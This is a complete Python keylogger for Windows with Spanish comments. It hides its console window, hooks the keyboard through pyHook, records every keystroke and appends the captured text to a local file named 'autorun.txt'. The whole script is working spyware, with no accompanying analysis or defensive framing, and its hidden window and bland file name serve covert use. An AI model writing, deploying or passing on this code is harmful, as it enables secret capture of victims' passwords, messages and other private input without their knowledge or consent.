import pyHook
import pythoncom
import win32console, win32gui

#Ocultar la consola
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Inicializar el registro como una cadena en blanco
data=''

#Función de escritura para escribir registros en un archivo de texto
def LogNow():
    global data
    if len(data) > 100:
        fp = open("autorun.txt", "a")
        fp.write(data)
        fp.close()
        data = ''
    return True

#Activar el evento de pulsación de tecla
def keypressed(event):
    global x, data
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.KeyID)
    data = data + keys
    LogNow()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = keypressed
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()